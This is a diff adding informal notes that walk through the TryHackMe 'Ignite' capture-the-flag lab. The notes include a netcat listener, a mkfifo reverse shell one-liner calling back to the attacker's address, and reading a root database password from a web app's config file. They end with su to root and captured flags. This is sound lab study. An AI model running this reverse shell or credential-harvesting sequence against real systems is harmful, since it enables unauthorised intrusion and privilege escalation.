@@ -52,3 +52,67 @@ File Type: HTML document, ASCII text, with CRLF line terminators
 was stuck on installing request module in python2 and glad i found an answer here 
 https://stackoverflow.com/questions/64376726/unable-to-install-requests-module-in-python2-7-kali-linux-as-it-keeps-appearin?noredirect=1#comment113836497_64376726
 
+open netcat on kali
+nc -lvnp 4444
+
+code for reverseshell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.102.117 4444 >/tmp/f
+
+https://unicornsec.com/home/tryhackme-ignite explanation 
+
+listening on [any] 4444 ...
+connect to [10.8.102.117] from (UNKNOWN) [10.10.141.217] 39652
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+
+$ cd /home
+$ ls
+www-data
+$ cd www-data
+$ ls
+flag.txt
+$ cat flag.txt
+6470e394cbf6dab6a91682cc8585059b 
+
+
+find / -name database.php  (got this clue from the webpage itself, the config details are stored in this file)
+find: '/var/tmp/systemd-private-f98332a1d1874cf0b78dcb439ab039ec-rtkit-daemon.service-4B3Pdw': Permission denied
+/var/www/html/fuel/application/config/database.php
+find: '/var/spool/rsyslog': Permission denied
+
+now we can get into that database.php
+
+we got something like this when we open it, now we got the password
+$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+
+
+using this gets me the filepath straight as i filtered out all those i cant access
+
+$ find / -name database.php 2>&1 | grep -v "Permission denied"
+/var/www/html/fuel/application/config/database.php
+
+get the shell up
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+www-data@ubuntu:/$ su
+su
+Password: mememe
+
+root@ubuntu:/# cat root/root.txt
+cat root/root.txt
+b9bbcb33e11b80be759c4e844862482d 
+
+and we got it!
+
+
+
+
